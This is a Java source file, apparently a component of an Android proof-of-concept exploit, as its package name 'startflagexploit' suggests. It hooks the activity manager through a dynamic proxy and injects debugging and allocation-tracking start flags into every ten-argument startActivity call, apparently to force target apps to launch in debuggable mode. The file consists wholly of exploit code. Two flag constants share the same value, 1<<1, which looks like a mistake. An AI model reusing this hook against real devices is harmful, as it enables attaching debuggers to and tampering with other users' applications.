package org.chickenhook.startflagexploit;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

public class AMSInvocationHandler implements InvocationHandler {


    private Object iamObject;

    AMSInvocationHandler(Object iamObject) {
        this.iamObject = iamObject;
    }
    private static final int START_FLAG_NATIVE_DEBUGGING = 1<<1;
    private static final int START_FLAG_DEBUG = 1<<1;
    private static final int START_FLAG_TRACK_ALLOCATION = 1<<2;

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if ("startActivity".equals(method.getName())) {
            if (args.length == 10) {
                args[args.length - 3] = ((int)args[args.length - 3]) |
                        START_FLAG_DEBUG |
                        START_FLAG_TRACK_ALLOCATION |
                        START_FLAG_NATIVE_DEBUGGING;
            }
        }
        return method.invoke(iamObject, args);
    }
}
